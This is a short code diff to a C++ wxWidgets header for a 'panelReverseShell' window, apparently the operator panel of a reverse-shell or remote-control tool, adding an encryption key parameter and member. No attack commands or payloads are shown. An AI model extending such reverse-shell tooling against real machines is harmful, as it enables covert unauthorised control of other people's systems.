@@ -12,7 +12,7 @@ namespace EnumReverseShell {
 
 class panelReverseShell : public wxFrame {
     public:
-        panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID);
+        panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key);
         
         ~panelReverseShell() {
             DEBUG_MSG("Destruyendo panelReverseShell");
@@ -31,6 +31,7 @@ class panelReverseShell : public wxFrame {
 
     private:
         wxTextCtrl* txtShellPath = nullptr;
+        ByteArray enc_key;
 
         //Historial
         std::vector<wxString> vc_History;
